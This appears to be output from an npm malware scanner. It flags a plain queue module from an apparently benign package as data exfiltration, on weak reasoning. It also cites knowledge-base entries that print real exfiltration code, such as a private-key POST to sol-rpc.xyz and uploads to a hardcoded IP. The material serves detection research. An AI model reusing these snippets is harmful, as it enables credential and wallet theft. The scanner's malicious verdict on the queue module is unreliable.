+                    "Connections to geolocation-db.com/json/ for geolocation data",
+                    "Unusual outbound traffic to domains not associated with legitimate package functionality"
+                  ],
+                  "how_to_detect": "Monitor npm packages for the presence of obfuscated code, especially in files that should not contain such logic (e.g., core library files or main entry points). Flag packages that access browser or Discord client storage directories, use regular expressions to search for Discord token patterns, or exfiltrate data to hardcoded domains or Discord webhooks. Detect base64-encoded environment variable exfiltration and the presence of remote access command handlers, particularly those integrated with Discord chat. Use network monitoring to identify suspicious outbound HTTP POST requests to known exfiltration endpoints such as aba45cf.glitch.me, Discord webhooks, and pipedream.net domains. Correlate these behaviors to identify malicious packages and prevent credential and data theft."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/prompt-eng/1.0.49/package/bin/queue.js",
+      "status": "success",
+      "is_malicious": true,
+      "total_slices": 1,
+      "malicious_slices": 1,
+      "slice_results": [
+        {
+          "slice_id": "queue_slice_1",
+          "code_snippet": "const axios = require(\"axios\");\n\nexports.Queue = class Queue {\n  static interval;\n\n  constructor() {\n    this.elements = {};\n    this.head = 0;\n    this.tail = 0;\n  }\n  enqueue(element) {\n    this.elements[this.tail] = element;\n    this.tail++;\n  }\n  dequeue() {\n    const item = this.elements[this.head];\n    delete this.elements[this.head];\n    this.head++;\n    return item;\n  }\n  peek() {\n    return this.elements[this.head];\n  }\n  get length() {\n    return this.tail - this.head;\n  }\n  get isEmpty() {\n    return this.length === 0;\n  }\n\n  static setQueueInterval(PromptProxy, serverURI, MAX_QUEUE_SIZE) {\n    Queue.interval = setInterval(async () => {\n      try {\n        if (!PromptProxy.queue.isEmpty) {\n          await axios.post(`${serverURI}/api/prompt/createPrompt`, {\n            ...PromptProxy.queue.dequeue(),\n          });\n        }\n      } catch (error) {\n        if (PromptProxy.queue.length >= MAX_QUEUE_SIZE) {\n          while (PromptProxy.queue >= MAX_QUEUE_SIZE) {\n            PromptProxy.queue.dequeue();\n          }\n        }\n      }\n    }, 2000);\n  }\n};",
+          "is_malicious": true,
+          "malice_score": 0.5020158469676972,
+          "confidence": 0.75,
+          "behavior_summary": "When called, the code uses the axios HTTP client to send data dequeued from an internal queue to a dynamically provided server URI via HTTP POST requests to the endpoint '/api/prompt/createPrompt'. The data sent originates from the PromptProxy.queue, which is managed internally by enqueue and dequeue operations. This behavior enables periodic exfiltration of queued data to a potentially hardcoded or externally controlled server URI, facilitating remote data transmission.",
+          "explanation": "[LLM Judgment: Malicious] The code implements a queue that periodically dequeues data and sends it via axios POST requests to a dynamically provided server URI endpoint '/api/prompt/createPrompt'. This behavior enables remote data transmission that can be controlled externally, which is a common pattern in data exfiltration malware. Although the code does not use obfuscated dependencies or import-time execution like the known axios-proxy malware, the core behavior of sending internal queued data to an external server is suspicious and aligns with exfiltration patterns. The similarity to known malicious patterns is moderate (around 0.5), but the direct use of axios to send potentially sensitive queued data to a remote endpoint on a timer strongly indicates malicious intent. The presence of a queue with controlled size and error handling to drop data when the queue is full further suggests an attempt to maintain stealth and persistence in data exfiltration. | Malicious Behavior: Periodic exfiltration of queued data to an externally controlled server URI via HTTP POST requests",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_781855_snippet_2",
+              "source_package": "nodejs-encrypt-agent, nodejs-cookie-proxy-agent, axios-proxy (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250102_111622_781855/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5339027643203735,
+              "code_similarity": 0.5638575553894043,
+              "behavior_similarity": 0.5039479732513428,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const axiosProxy = require('axios-proxy');",
+                "code_behavior": "At import-time, the code imports the malicious 'axios-proxy' dependency, which triggers the execution of its own bundled 'lib.exe' infostealer, resulting in the exfiltration of sensitive user data.",
+                "malice_analysis": {
+                  "why_suspicious": "The package leverages a dependency chain to obscure the delivery and execution of the malicious executable, making detection more difficult and hiding the true source of the malware.",
+                  "violated_expectations": "Legitimate packages do not use indirect dependencies to deliver or execute malware, nor do they conceal malicious actions within dependencies.",
+                  "similar_legitimate_use": "Dependency chains are common for code reuse, but not for the purpose of hiding or delivering malware. Legitimate dependencies are transparent and documented.",
+                  "key_indicators": [
+                    "Obfuscated malware delivery via indirect dependency ('axios-proxy')",
+                    "No legitimate functional reason for the dependency on 'axios-proxy'",
+                    "Malicious code is not present in the main package but in a dependency",
+                    "Dependency executes a bundled PE file at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "src/index.js (and other JS files in nodejs-cookie-proxy-agent)",
+                  "required_permissions": [
+                    "filesystem",
+                    "process",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs-encrypt-agent, nodejs-cookie-proxy-agent, axios-proxy",
+                  "package_manager": "npm",
+                  "package_versions": "nodejs-encrypt-agent: 6.0.2, 6.0.3, 6.0.4, 6.0.5; nodejs-cookie-proxy-agent: 1.1.0, 1.2.0, 1.2.1, 1.2.2, 1.2.3, 1.2.4; axios-proxy: 1.7.3, 1.7.4, 1.7.7, 1.7.9, 1.8.9, 1.9.9",
+                  "why_malicious": "These npm packages impersonate legitimate NodeJS libraries but contain or deliver a malicious Windows executable ('lib.exe') that masquerades as a NodeJS component. Upon installation or import, the packages drop and execute this infostealer (TurkoRAT), which exfiltrates sensitive data such as credentials and cryptocurrency wallets. The packages employ dependency obfuscation and anti-analysis techniques to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs a malicious npm package (nodejs-encrypt-agent, nodejs-cookie-proxy-agent, or axios-proxy).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded at import-time."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious JavaScript code executes at import-time, either directly (nodejs-encrypt-agent, axios-proxy) or via a dependency (nodejs-cookie-proxy-agent -> axios-proxy).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of bundled 'lib.exe' infostealer."
+                  },
+                  {
+                    "step": 3,
+                    "action": "'lib.exe' (TurkoRAT infostealer) runs, harvesting credentials, crypto wallets, and other sensitive data from the victim's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of stolen data to attacker-controlled infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that execute bundled Windows PE files (e.g., 'lib.exe') at import-time using child_process.execFile",
+                    "Silent execution of native binaries immediately upon package import",
+                    "Obfuscated malware delivery through indirect dependency chains (e.g., nodejs-cookie-proxy-agent -> axios-proxy)"
+                  ],
+                  "file_indicators": [
+                    "Presence of large Windows PE files (such as 'lib.exe') in npm package src or root directories",
+                    "Unexpected executable files (e.g., .exe) within JavaScript/TypeScript package trees",
+                    "lib.exe file with characteristics matching TurkoRAT in npm package contents"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections from 'lib.exe' process to suspicious or attacker-controlled domains/IPs",
+                    "Unusual data exfiltration patterns originating from NodeJS or spawned child processes",
+                    "Network traffic from 'lib.exe' to known TurkoRAT C2 infrastructure"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for the presence and execution of Windows PE files, especially those named 'lib.exe' or similar, within package directories. Flag packages that use child_process to execute bundled binaries at import-time. Analyze dependency chains for indirect delivery of executables. Monitor network traffic from NodeJS and spawned processes for signs of credential or wallet exfiltration, and correlate with known TurkoRAT C2 indicators."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104205_631146_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49004703760147095,
+              "code_similarity": 0.430677205324173,
+              "behavior_similarity": 0.5494168996810913,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + process.env.API_KEY;\nuserPrompt = getUserPrompt();\nfinalPrompt = systemPrompt + userPrompt;\nresponse = LLM.generate(finalPrompt);",
+                "code_behavior": "At runtime, the code constructs a system prompt by concatenating a static string with the value of process.env.API_KEY, then appends the userPrompt and sends the combined prompt to LLM.generate, risking exposure of sensitive secrets if the prompt is ever returned or leaked.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets such as API keys in prompts exposes them to potential leakage if the prompt is logged, returned to the user, or otherwise exposed, enabling credential theft and further compromise.",
+                  "violated_expectations": "System prompts must never include sensitive information; secrets should be handled securely and never incorporated into model input or user-facing content.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; this practice is always a security risk.",
+                  "key_indicators": [
+                    "Inclusion of environment variables or secrets in prompt construction",
+                    "Concatenation of sensitive data with user-accessible prompt content",
+                    "Potential for prompt content to be exposed to users or logs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "LLM application prompt builder",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806913_snippet_2",
+              "source_package": "nodejs-encrypt-agent, nodejs-cookie-proxy-agent (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_103502_806913/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48831281065940857,
+              "code_similarity": 0.495094895362854,
+              "behavior_similarity": 0.48153072595596313,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious dependency import\nconst axiosProxy = require('axios-proxy');\naxiosProxy.steal();",
+                "code_behavior": "At import-time, the code imports a malicious dependency ('axios-proxy') that executes TurkoRat infostealer logic, harvesting credentials, cookies, and wallet data from the filesystem and environment variables, then exfiltrating this data over the network to attacker-controlled infrastructure.",
+                "malice_analysis": {
+                  "why_suspicious": "The package imports a non-standard dependency that is used solely to execute infostealer code, enabling credential and wallet theft as soon as the package is loaded.",
+                  "violated_expectations": "Normal dependencies should not contain or execute malware; importing a dependency should not trigger credential theft or data exfiltration.",
+                  "similar_legitimate_use": "Legitimate dependencies may perform setup or configuration, but do not access or transmit sensitive user data such as credentials or wallet files.",
+                  "key_indicators": [
+                    "Malicious code hidden in a non-standard dependency ('axios-proxy')",
+                    "Automatic execution of infostealer logic on import",
+                    "Network exfiltration of sensitive data during dependency import",
+                    "Unexpected dependency on modules not referenced in documentation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "imported dependency (axios-proxy) in nodejs-cookie-proxy-agent",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs-encrypt-agent, nodejs-cookie-proxy-agent",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions prior to removal",
+                  "why_malicious": "Both packages contain the TurkoRat infostealer, an open-source malware designed to steal sensitive information such as credentials, cookies, and cryptocurrency wallets. The packages use deceptive naming and dependency confusion techniques to disguise the presence of the malware, aiming to compromise developer machines via supply chain attacks. The malicious logic is executed automatically upon import, enabling immediate data theft and exfiltration without user interaction."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package (nodejs-encrypt-agent or nodejs-cookie-proxy-agent).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of TurkoRat infostealer logic"
+                  },
+                  {
+                    "step": 2,
+                    "action": "TurkoRat code executes, harvesting credentials, cookies, and wallet data from the infected machine by accessing the filesystem and environment variables.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Exfiltration of stolen data"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Stolen data is exfiltrated to attacker-controlled infrastructure over the network using HTTP requests.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive information"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Immediate execution of infostealer logic on package import",
+                    "Access to credential stores, cookies, and wallet files during import or installation",
+                    "Network exfiltration of sensitive data (credentials, cookies, wallet files) during package import"
+                  ],
+                  "file_indicators": [
+                    "Presence of TurkoRat code or modules (e.g., turkorat.js) in package files",
+                    "Unexpected dependency on 'axios-proxy' or other non-standard modules",
+                    "Discrepancy between package name and readme.md name (e.g., package.json lists 'nodejs-encrypt-agent' but documentation refers to 'agent-base')"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known TurkoRat C2 domains or IP addresses",
+                    "Unusual HTTP POST requests containing credential, cookie, or wallet data during package import or installation"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive files or environment variables and initiate outbound network connections during import or installation. Flag packages with suspicious or undocumented dependencies (such as 'axios-proxy') or discrepancies between package.json and documentation. Use YARA rules or static analysis to detect embedded TurkoRat code. Monitor for network traffic to known TurkoRat C2 infrastructure and for HTTP POST requests containing credential or wallet data during package import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_057618_snippet_1",
+              "source_package": "@solana/web3.js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_057618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48013097047805786,
+              "code_similarity": 0.509319007396698,
+              "behavior_similarity": 0.4509429335594177,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function addToQueue(privateKey) {\n  fetch('https://sol-rpc.xyz', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'CF-Connecting-IP': '1.1.1.1',\n      'CF-IPCountry': 'US',\n      'CF-Ray': '1234567890',\n      'CF-Visitor': '{\"scheme\":\"https\"}'\n    },\n    body: JSON.stringify({ key: privateKey })\n  });\n}",
+                "code_behavior": "At runtime, the code intercepts private key material during cryptographic operations, serializes the private key, and sends it via an HTTP POST request to the hardcoded external domain sol-rpc.xyz with CloudFlare-mimicking headers, resulting in silent exfiltration of sensitive credentials.",
+                "malice_analysis": {
+                  "why_suspicious": "The function captures private key material and transmits it to an external server without user knowledge or consent. The use of CloudFlare-like headers is an attempt to disguise the malicious network traffic as legitimate, further indicating intent to evade detection.",
+                  "violated_expectations": "A cryptographic library is expected to keep all private key material strictly local and never transmit it over the network. The presence of code that exfiltrates private keys is a direct violation of security best practices and user trust.",
+                  "similar_legitimate_use": "No legitimate cryptographic library should ever transmit private keys externally. Only in rare, explicit backup or export scenarios—always with clear user consent—would key export occur, and never silently or to an untrusted third-party domain.",
+                  "key_indicators": [
+                    "Network request to hardcoded, suspicious domain (sol-rpc.xyz)",
+                    "Exfiltration of private key material via HTTP POST",
+                    "Use of CloudFlare-mimicking headers in outbound requests",
+                    "Injection into code paths that handle sensitive cryptographic operations",
+                    "Function named addToQueue or similar, not present in legitimate versions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during cryptographic operations involving private keys)",
+                  "file_location": "core library files responsible for key management (injected into code paths that access private keys)",
+                  "required_permissions": [
+                    "network (outbound HTTP/HTTPS access)",
+                    "access to private key material in memory",
+                    "ability to read environment variables (for potential context or evasion)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@solana/web3.js",
+                  "package_manager": "npm",
+                  "package_versions": "1.95.6, 1.95.7",
+                  "why_malicious": "These versions contain injected JavaScript code that exfiltrates private keys to an attacker-controlled server (sol-rpc.xyz) whenever cryptographic operations access private key material. This enables remote theft of cryptocurrency assets from any application or developer using these versions, as the exfiltration is silent and occurs during normal library usage."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is injected into the @solana/web3.js library and published to npm as versions 1.95.6 and 1.95.7.",
+                    "implemented_by": [],
+                    "leads_to": "Developers and applications unknowingly install the compromised package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During normal cryptographic operations, the injected addToQueue function intercepts private key material in memory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Private keys are captured by the malicious function during legitimate usage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The addToQueue function serializes and sends the captured private key to the attacker's server (sol-rpc.xyz) using an HTTP POST request with disguised CloudFlare headers.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives private keys and can use them to access and drain affected wallets."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker uses exfiltrated private keys to steal funds from affected wallets, transferring assets to a hardcoded Solana address under their control.",
+                    "implemented_by": [],
+                    "leads_to": "Final goal: theft of cryptocurrency assets from victims."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unexpected outbound network requests from cryptographic libraries during private key operations",
+                    "HTTP/HTTPS POST requests to suspicious or newly registered domains (e.g., sol-rpc.xyz)",
+                    "Outbound requests containing serialized private key material in the body",
+                    "Use of CloudFlare-like headers (e.g., CF-Connecting-IP, CF-IPCountry) in requests from non-web server code",
+                    "Presence of functions that access and transmit private key material"
+                  ],
+                  "file_indicators": [
+                    "Presence of addToQueue or similarly named functions in @solana/web3.js source or built files",
+                    "Injected code within core cryptographic routines or key management modules",
+                    "References to sol-rpc.xyz in source code, minified bundles, or build artifacts"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests to sol-rpc.xyz",
+                    "Network traffic with CloudFlare-mimicking headers originating from development or production environments using @solana/web3.js",
+                    "Connections to sol-rpc.xyz (registered via NameSilo on Nov 22, 2024) from systems running affected package versions"
+                  ],
+                  "how_to_detect": "Monitor for any network requests originating from @solana/web3.js or related cryptographic libraries, especially those targeting sol-rpc.xyz or containing CloudFlare-mimicking headers. Scan source and built files for suspicious functions like addToQueue or hardcoded references to sol-rpc.xyz. Use dependency scanning tools to flag usage of @solana/web3.js versions 1.95.6 and 1.95.7. Alert on any code paths that serialize and transmit private key material externally, and correlate with network logs for POST requests to suspicious domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_064300_snippet_4",
+              "source_package": "express-dompurify (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_064300/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47533535957336426,
+              "code_similarity": 0.3999352753162384,
+              "behavior_similarity": 0.5507354736328125,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "hostURL = 'http://95.216.251.178:8001';\n\nfunction Upload() {\n    const _0xd8457b = {\n        'url': hostURL + '/uploads',\n        'formData': _0x585502\n    };\n    yield request.post(_0xd8457b);\n}",
+                "code_behavior": "At runtime, the code constructs a POST request to a hardcoded external server at http://95.216.251.178:8001/uploads, sending form data containing previously gathered sensitive information.",
+                "malice_analysis": {
+                  "why_suspicious": "Use of a hardcoded, non-legitimate server for data exfiltration is a strong indicator of malicious intent and is not required for DOM sanitization.",
+                  "violated_expectations": "A DOM sanitization library should not communicate with unknown external servers or exfiltrate user data.",
+                  "similar_legitimate_use": "None; legitimate libraries do not exfiltrate user data to arbitrary endpoints.",
+                  "key_indicators": [
+                    "Hardcoded IP address and endpoint",
+                    "POST requests with sensitive data",
+                    "No user interaction or consent for data transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package JavaScript file",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-dompurify",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (as of report time)",
+                  "why_malicious": "The package impersonates the trusted DOMPurify library and contains heavily obfuscated JavaScript code that, upon import or execution, steals sensitive data from the host system—including browser credentials, cryptocurrency wallet files, keychain data, and system identifiers—and exfiltrates this information to an attacker-controlled server via hardcoded network requests."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated code is loaded and executed upon import or at runtime.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Sensitive data collection from the host system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Harvest browser credentials by reading and decrypting browser profile data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are prepared for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvest cryptocurrency wallet files from known wallet directories.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Wallet data is prepared for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collect system information (e.g., serial number) and package all stolen data.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data is ready for exfiltration"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Exfiltrate all collected data to the attacker's server via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives sensitive data; compromise complete"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to browser profile directories and 'Login Data' SQLite files",
+                    "Decryption of browser-stored credentials using system APIs",
+                    "Access to cryptocurrency wallet directories such as ~/.electrum and ~/.bitcoin",
+                    "Obfuscated code with dynamic variable and function names",
+                    "Outbound HTTP POST requests to hardcoded, non-standard endpoints"
+                  ],
+                  "file_indicators": [
+                    "Access to files like 'Login Data' in browser profile directories",
+                    "Access to ~/.electrum, ~/.bitcoin, and similar wallet directories",
+                    "Presence of obfuscated code blocks and dynamic variable arrays in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to http://95.216.251.178:8001/uploads",
+                    "Outbound connections to hardcoded IP addresses or domains not associated with the legitimate DOMPurify library"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that access browser profile or wallet directories, especially those that read and decrypt 'Login Data' files or access ~/.electrum and ~/.bitcoin. Flag any package making HTTP POST requests to unknown or hardcoded endpoints, particularly http://95.216.251.178:8001/uploads. Use static and dynamic analysis to detect obfuscated code and dynamic variable/function name generation. Alert on any package that exfiltrates system information or sensitive files to external servers."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
